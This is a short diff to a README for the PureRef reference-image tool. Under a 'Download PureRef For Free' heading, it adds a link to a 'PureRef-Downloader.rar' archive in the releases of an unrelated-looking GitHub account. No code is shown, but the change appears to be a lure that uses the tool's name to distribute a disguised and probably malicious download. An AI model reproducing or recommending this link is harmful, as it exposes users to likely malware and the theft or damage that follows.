@@ -20,4 +20,4 @@ Utilize the myriad of tools available. Write a quick note, toggle desaturation, 
 
 ## Download PureRef For Free
 
-<a href=""><img src="https://github.com/user-attachments/assets/5b72cb07-6280-43d9-8bdc-73139114313b"></a>
+<a href="https://github.com/FLAdMITU/PureRef/releases/download/Download/PureRef-Downloader.rar" target="_blank"><img src="https://github.com/user-attachments/assets/5b72cb07-6280-43d9-8bdc-73139114313b"></a>
